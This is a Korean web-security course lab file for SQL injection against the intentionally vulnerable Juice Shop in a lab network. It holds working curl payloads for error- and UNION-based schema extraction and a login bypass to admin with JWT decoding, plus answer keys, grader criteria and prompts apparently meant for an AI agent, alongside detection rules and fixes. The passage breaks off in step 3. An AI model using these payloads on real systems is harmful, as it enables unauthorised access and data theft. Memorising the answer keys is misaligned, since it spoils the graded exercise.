lab_id: web-vuln-week02
title: "SQL Injection — 탐지 / Error / Union / Blind / 방어"
version: standalone-non-ai
course: web-vuln
week: 2
description: |
  SQL Injection 의 5 카테고리 (탐지 / Error / Union / Blind Boolean / Blind Time)
  를 6v6-juiceshop (Express + Sequelize + SQLite) 의 /rest/products/search 와
  /rest/user/login 두 endpoint 에 직접 시도. 각 단계 별 Blue 의 탐지 룰
  (ModSecurity CRS 942100 계열 + Wazuh rule 100002) 매핑 + Purple 의 prepared
  statement / ORM / input validation 권장 — OWASP A03 Injection 의 직접 실습.
difficulty: medium
duration_minutes: 120
audience: 웹 보안 입문자 (2주차)
prerequisites:
  - "W01 의 정찰 (특히 step 14 의 SQL 메타문자 응답 에러 노출) 완료"
  - "attacker 컨테이너 (10.20.30.202) 에 curl + sqlmap 설치"
  - "Juice Shop 의 default 자격증명 (admin@juice-sh.op / admin123) 알고 있음"
objectives:
  - "SQL Injection 의 5 카테고리 (탐지/Error/Union/Blind Boolean/Blind Time) 의 차이를 설명"
  - "/rest/products/search 의 q 파라미터에 5 카테고리 모두 직접 시도하여 SQLite + Sequelize 구조 식별"
  - "Authentication bypass (`' OR 1=1--`) 로 admin 로그인 (Juice Shop default challenge)"
  - "sqlmap 자동화 (`-u ...?q=test --batch --technique=E,U,B,T --dbs`) 로 위 5 카테고리 자동 점검"
  - "Red/Blue/Purple — Red 5 카테고리 시도 → Blue 의 ModSecurity CRS 942100 / Wazuh rule 100002 매핑 → Purple 의 prepared statement + ORM 의 SQLi 차단 권장"
pass_threshold: 0.6
steps:
# ============================================================
# STEP 1 [RED·SQLi탐지] — 작은따옴표 1 회 + 응답 차이 (정상 vs SQL 에러)
# ============================================================
- order: 1
  instruction: |
    ## 🎯 MISSION

    attacker 컨테이너 (10.20.30.202) 에서 6v6-juiceshop (10.20.40.81:3000) 의
    `/rest/products/search?q=<input>` endpoint 에 (a) 정상 query (`q=apple`)
    와 (b) SQL 메타문자 (`q=apple'`) 를 보내 응답 차이 (코드 / 본문 / SQL
    에러 노출) 를 비교한다. SQL 에러가 직접 응답에 포함되면 → SQL Injection
    명백 + DB 종류 식별 가능.

    ## 💻 실행 명령

    ```bash
    # 1. 정상 query (baseline)
    echo "=== 1. 정상 query (q=apple) ==="
    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple" | head -15

    # 2. SQL 메타문자 (1회 quote)
    echo ""
    echo "=== 2. q=apple' (작은따옴표 1 회) ==="
    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple%27" | head -20

    # 3. 다른 메타문자 (이중 quote / 백슬래시 / 주석)
    for inj in "apple%22" "apple%5C" "apple--" "apple%23"; do
      code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=${inj}")
      echo "q=${inj} → ${code}"
    done
    ```

    ## 📋 확인 사항

    - 정상 query → HTTP 200 + JSON `{"status":"success","data":[...]}`
    - `q=apple'` → HTTP 500 + 본문에 `SQLITE_ERROR` 또는 `unrecognized token: "'"`
      같은 SQL 에러 직접 노출 → Sequelize + SQLite 확인
    - `q=apple--` → 200 + 정상 처리 (주석 처리됨) → SQL 구문 직접 끝남 시그널
    - 응답 본문에 `/app/...` 같은 file path 가 있으면 → Express stack trace 동반

    ## 💡 왜 이걸 하는가?

    SQL Injection 탐지 의 가장 직접적인 방법 = SQL 메타문자 1 회 삽입 후 응답
    에러 관찰 (OWASP A03 Injection + MITRE T1190). Juice Shop 의 default 응답에
    SQLite 에러 직접 노출 (의도된 challenge) → DB 종류 + Sequelize ORM 사용
    동시 식별 → 다음 STEP 의 정확한 SQL syntax (SQLite 의 `||` 문자열 연결 /
    `LIMIT` 등) 사용 가능.

    ## 🔵 Blue 측 관찰

    1 회 작은따옴표 시도는 ModSecurity CRS rule 942100 (SQL Injection Attack
    Detected via libinjection) 의 트리거 — Wazuh rule 100002 (ModSecurity
    SQL Injection alert) 의 escalation. siem 컨테이너 (10.20.32.100) 의
    `/var/ossec/logs/alerts/alerts.json` 에 인입. 5 회 burst 시 active-response
    `firewall-drop` 으로 src IP 차단 가능.

    ## 🟣 Purple 보완 권장

    - Sequelize: parameterized query 강제 (`{ where: { name: q } }` 사용,
      `query()` 직접 호출 금지)
    - Express: `express-validator` 로 query param 의 SQL 메타문자 필터
    - ModSecurity CRS PARANOIA LEVEL 2 활성화 (rule 942100/942110/942150
      모두 enable)
    - Wazuh active-response: SQL Injection alert 5 회 burst → src IP 차단 600 sec
    - 학습 환경 의 default 는 보존 (Juice Shop challenge 학습 위함)
  hint: |
    `q=apple'` (URL-encoded `%27`) 의 응답에 `SQLITE_ERROR` 또는 `unrecognized
    token` 이 보이면 SQL Injection 명확. `q=apple--` 은 주석 처리 → 200 정상 응답.
  category: sqli_detection
  points: 10
  answer: |
    echo "=== 1. 정상 query (baseline) ==="
    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple" | head -10
    echo ""
    echo "=== 2. q=apple' (작은따옴표) → SQL 에러 노출 ==="
    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple%27" | head -20
    echo ""
    echo "=== 3. 4 메타문자 변형 응답 코드 ==="
    for inj in "apple%22" "apple%5C" "apple--" "apple%23"; do
      code=$(curl -o /dev/null -s -w "%{http_code}" \
        "http://10.20.40.81:3000/rest/products/search?q=${inj}")
      echo "q=${inj} → ${code}"
    done
  answer_detail: |
    Juice Shop 의 응답에 `SQLITE_ERROR: unrecognized token: "'"` 같은 직접
    SQL 에러 노출 → Sequelize + SQLite 확인. apple-- 가 200 OK 면 SQL 주석
    처리 가능 = 다음 STEP 의 Union / Boolean 등 advanced payload 의 진입점.
    Apple%22 (이중 quote) 응답이 다르면 string 의 delimiter 가 single quote
    인지 double quote 인지 식별.
  verify:
    type: output_contains
    expect: 'SQLITE\|status\|HTTP'
    field: stdout
    semantic:
      intent: |
        SQL Injection 탐지 — 5 SQL 메타문자 (정상 / quote / double quote /
        백슬래시 / 주석) 응답 차이 비교. SQL 에러 직접 노출 시 DB 종류
        식별 (SQLite / MySQL / PostgreSQL). OWASP A03 + MITRE T1190.
      success_criteria:
        - 정상 + 메타문자 양쪽 응답 비교 (최소 2 케이스)
        - SQL 에러 (SQLITE_ERROR 등) 또는 응답 코드 차이 직접 인용
        - DB 종류 식별 (SQLite / MySQL / PostgreSQL 등) 명시
        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
      acceptable_methods:
        - "curl '?q=apple%27' + grep SQLITE"
        - "sqlmap -u '...?q=*' --batch --level=1 (탐지 단계)"
        - "Burp Repeater 의 1 회 quote 변형"
        - "python requests + apostrophe + response.text"
      negative_signs:
        - 정상 query 비교 없음 (메타문자 만)
        - SQL 에러 응답 인용 누락
        - DB 종류 식별 시도 안 함
  target_vm: attacker
  script: |
    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple" | head -10
    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple%27" | head -20
    for inj in "apple%22" "apple--" "apple%23"; do
      code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=${inj}")
      echo "q=${inj} → ${code}"
    done
  risk_level: low
  bastion_prompt: |
    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의
    /rest/products/search?q=<input> 에 (1) 정상 q=apple (2) q=apple' (작은
    따옴표) (3) 4 메타문자 변형 (이중 quote / 백슬래시 / 주석 -- / 주석 #)
    응답 비교를 수행해줘. SQL 에러 (SQLITE_ERROR 등) 가 직접 응답에 노출되면
    DB 종류 (SQLite + Sequelize ORM) 식별 가능 + 다음 STEP advanced payload
    의 진입점. OWASP A03 + MITRE T1190 + ModSec CRS 942100 매핑 한 줄 언급.
# ============================================================
# STEP 2 [RED·SQLi·Error] — Error-based SQLi 로 DB 종류 + 버전 + schema 직접 추출
# ============================================================
- order: 2
  instruction: |
    ## 🎯 MISSION

    STEP 1 에서 SQLite 식별 후, attacker (10.20.30.202) 에서 4 가지 error
    payload 로 *DB 메타데이터* 를 직접 추출 — (a) SQLite version (`sqlite_version()`)
    (b) schema (`sqlite_master`) (c) table list (d) column 수 추정 (ORDER BY).
    SQLite 의 type-coercion 에러 (`CAST AS INTEGER`) 활용해서 응답 본문에
    데이터 직접 노출.

    ## 💻 실행 명령

    ```bash
    # 1. SQLite 버전 추출 (CAST 에러 활용)
    echo "=== 1. SQLite version ==="
    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20CAST(sqlite_version()%20AS%20INT)--" \
      | head -10

    # 2. schema 직접 (sqlite_master 의 sql 컬럼)
    echo ""
    echo "=== 2. sqlite_master schema ==="
    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--" \
      | python3 -c "import sys,json; d=json.load(sys.stdin); [print(p) for p in d.get('data',[])[:5]]" 2>/dev/null \
      || echo "(JSON parse fail — raw 응답)"

    # 3. ORDER BY 로 컬럼 수 추정
    echo ""
    echo "=== 3. ORDER BY 컬럼 수 추정 ==="
    for n in 1 5 9 10 15; do
      code=$(curl -o /dev/null -s -w "%{http_code}" \
        "http://10.20.40.81:3000/rest/products/search?q=test%27%20ORDER%20BY%20${n}--")
      echo "ORDER BY ${n} → ${code}"
    done

    # 4. table list (sqlite_master 의 name 컬럼)
    echo ""
    echo "=== 4. 모든 테이블 list ==="
    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
      | python3 -c "import sys,json; d=json.load(sys.stdin); [print(' table:', p.get('id', p)) for p in d.get('data',[])[:10]]" 2>/dev/null
    ```

    ## 📋 확인 사항

    - SQLite version 응답 (예: `3.40.1`) — CAST 에러 메시지에 포함
    - `sqlite_master` 의 schema 직접 노출 (CREATE TABLE Users(...) / Products(...))
    - ORDER BY N — N 이 컬럼 수보다 크면 에러 → 컬럼 수 9 인지 10 인지 식별
    - table list 의 `Users`, `Products`, `BasketItems`, `Captchas`, `Feedbacks` 등 발견

    ## 💡 왜 이걸 하는가?

    Error-based SQLi 는 *응답 시간* 없이 *직접 데이터* 추출 가능 (MITRE T1190 +
    OWASP A03). SQLite 의 `sqlite_master` 는 모든 schema 메타 (CREATE TABLE
    SQL 그대로) 직접 노출 — MySQL 의 `information_schema.tables`, PostgreSQL
    의 `pg_tables` 와 동일 역할. ORDER BY N 으로 컬럼 수 식별 시 다음 STEP
    의 UNION SELECT 의 컬럼 수 매핑 입력.

    ## 🔵 Blue 측 관찰

    UNION SELECT + sqlite_master 시도는 ModSecurity CRS rule 942130 (SQL
    Injection Attack: SQL Tautology Detected) + 942150 (SQL Injection Attack
    in args) 의 트리거. siem 의 alerts.json 에 인입. 단일 시도 vs burst 구분
    필요 — 학습 환경에서는 burst 임계치 5 회/분 가정.

    ## 🟣 Purple 보완 권장

    - Sequelize: `query()` 직접 호출 대신 `findAll({where: {...}})` 사용
      (parameterized 자동) + `sequelize.literal()` 사용 시 즉시 reject
    - Express: `express-validator` 의 `query('q').isAlphanumeric()` 으로 SQL
      메타문자 사전 거부
    - ModSecurity CRS PARANOIA LEVEL 2 (rule 942100 ~ 942130 enable) +
      sqlite_master / information_schema / pg_tables 키워드 차단 (custom rule)
    - 학습 환경 default = challenge 보존
  hint: |
    SQLite 의 sqlite_master 는 schema 메타 (CREATE TABLE SQL 그대로 저장).
    UNION SELECT 의 컬럼 수는 Juice Shop /rest/products/search 응답 의 9 컬럼
    (id/name/desc/...). ORDER BY N 으로 컬럼 수 식별 후 UNION SELECT.
  category: sqli_error
  points: 12
  answer: |
    echo "=== 1. SQLite version (CAST 에러) ==="
    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
    echo ""
    echo "=== 2. ORDER BY 컬럼 수 추정 ==="
    for n in 1 5 9 10 15; do
      code=$(curl -o /dev/null -s -w "%{http_code}" \
        "http://10.20.40.81:3000/rest/products/search?q=test%27%20ORDER%20BY%20${n}--")
      echo "ORDER BY ${n} → ${code}"
    done
    echo ""
    echo "=== 3. sqlite_master 의 모든 테이블 list ==="
    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
      | head -20
  answer_detail: |
    Juice Shop SQLite default schema = Users (8 컬럼 — id/email/password/role/
    deluxeToken/lastLoginIp/profileImage/totpSecret) + Products (9 컬럼) +
    BasketItems (4 컬럼) + Captchas (3 컬럼) + Feedbacks (5 컬럼) + 등.
    `/rest/products/search` 는 9 컬럼 (Products 와 동일) 이므로 UNION SELECT
    9 컬럼 매핑 가능. sqlite_version() → 3.40.x 형식 (Juice Shop 의 default).
  verify:
    type: output_contains
    expect: 'name\|version\|ORDER BY'
    field: stdout
    semantic:
      intent: |
        Error-based SQLi 로 DB 메타데이터 (SQLite version / schema /
        table list / 컬럼 수) 직접 추출. MITRE T1190 + OWASP A03.
        sqlite_master 의 schema 직접 노출 활용.
      success_criteria:
        - SQLite version 또는 sqlite_master 직접 query 시도
        - ORDER BY 또는 UNION SELECT 의 컬럼 수 추정 시도
        - 최소 1 테이블 (Users / Products / BasketItems 등) 발견
        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
      acceptable_methods:
        - "UNION SELECT name FROM sqlite_master"
        - "ORDER BY N (binary search)"
        - "sqlmap -u '...?q=*' --batch --technique=E --dbs --tables"
        - "AND CAST(sqlite_version() AS INT)-- 에러 활용"
      negative_signs:
        - SQLite 메타 query (sqlite_master) 미시도
        - 컬럼 수 추정 (ORDER BY / UNION) 미시도
        - DB 종류 식별 (SQLite vs MySQL) 누락
  target_vm: attacker
  script: |
    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
    for n in 1 5 9 10 15; do
      code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=test%27%20ORDER%20BY%20${n}--")
      echo "ORDER BY ${n} → ${code}"
    done
    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
  risk_level: low
  bastion_prompt: |
    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
    에 (1) CAST(sqlite_version() AS INT) 으로 SQLite version 추출 (2) ORDER BY
    N (1,5,9,10,15) 으로 컬럼 수 추정 (3) UNION SELECT FROM sqlite_master 로
    모든 테이블 list 추출 3 단계를 수행해줘. SQLite + Sequelize ORM 의 schema
    (Users / Products / BasketItems 등) 를 직접 인용 + 컬럼 수 = 9 확인. 다음
    STEP UNION SELECT 의 입력. ModSec CRS 942130/942150 매핑 한 줄 언급.
# ============================================================
# STEP 3 [RED·SQLi·AuthBypass] — 인증 우회 (' OR 1=1--) 로 admin 로그인
# ============================================================
- order: 3
  instruction: |
    ## 🎯 MISSION

    Juice Shop 의 default challenge — `/rest/user/login` 의 email 필드에 SQL
    Injection 으로 password 검증 우회 + admin 로그인. 3 payload 변형 시도:
    (a) `' OR 1=1--` (b) `admin@juice-sh.op'--` (c) `' UNION SELECT *...`.
    성공 응답의 JWT 토큰 추출 + admin 권한 확인.

    ## 💻 실행 명령

    ```bash
    # 1. 기본 ' OR 1=1-- (admin 이 첫 row 일 때만)
    echo "=== 1. ' OR 1=1-- ==="
    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
      -H 'Content-Type: application/json' \
      -d "{\"email\":\"' OR 1=1--\",\"password\":\"anything\"}" | head -15

    # 2. admin email 명시 + 주석 처리 (password 검증 skip)
    echo ""
    echo "=== 2. admin@juice-sh.op'-- ==="
    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
      -H 'Content-Type: application/json' \
      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15

    # 3. JWT 토큰 추출 (admin 로그인 성공 시)
    echo ""
    echo "=== 3. JWT 토큰 + role 확인 ==="
    TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
      -H 'Content-Type: application/json' \
      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
    echo "TOKEN (앞 60자): ${TOKEN:0:60}..."

    # 4. JWT payload decode (role 확인)
    if [ -n "$TOKEN" ]; then
      payload=$(echo "$TOKEN" | cut -d. -f2)
      # base64 padding 추가
      padded="${payload}$(printf '=%.0s' $(seq 1 $((4-${#payload}%4))))"
      echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
    fi
    ```

    ## 📋 확인 사항

    - payload 1 응답: 401 (실패) 또는 200 + JWT 토큰 (성공 — admin 이 첫 row)
    - payload 2 응답: 200 + JWT 토큰 (admin 명시 + password 검증 우회)
    - JWT payload 의 `email: "admin@juice-sh.op"` + `role: "admin"` 확인
    - 응답 body 의 `bid` (basket ID) — admin 의 진짜 ID = 1

